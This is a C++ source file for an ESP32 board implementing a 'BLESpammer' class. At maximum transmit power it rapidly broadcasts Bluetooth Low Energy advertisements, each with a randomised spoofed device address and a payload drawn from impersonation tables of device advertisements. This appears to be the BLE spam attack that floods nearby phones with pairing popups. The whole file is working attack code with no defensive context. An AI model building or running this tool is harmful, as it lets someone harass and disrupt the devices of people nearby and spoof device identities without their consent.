#include "BLESpammer.h"

BLESpammer::BLESpammer(const char* deviceName) {
  this->deviceName = deviceName;
}

void BLESpammer::begin() {
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");

  BLEDevice::init(deviceName);

  // Set BLE power level
  setTxPower(ESP_PWR_LVL_P9);  // Default max power for ESP32C3, ESP32C2, and ESP32S3

  // Create the BLE Server
  BLEServer* pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // Set the address to random (you could make this configurable)
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void BLESpammer::startAdvertising() {
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);

  // It seems for some reason first 4 bits
  // Need to be high (aka 0b1111), so we 
  // OR with 0xF0
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  int device_choice = random(2);
  if (device_choice == 0){
    int index = random(17);
    oAdvertisementData.addData(String((char*)DEVICES[index], 31));
  } else {
    int index = random(13);
    oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
  }
  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);
  pAdvertising->setMinInterval(0x20);
  pAdvertising->setMaxInterval(0x20);
  pAdvertising->setMinPreferred(0x20);
  pAdvertising->setMaxPreferred(0x20);
  pAdvertising->start();
  Serial.println("Packet send...");
  delay(100);
  pAdvertising->stop();
  
}

void BLESpammer::stopAdvertising() {
  pAdvertising->stop();
}

void BLESpammer::setTxPower(esp_power_level_t powerLevel) {
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, powerLevel);
}
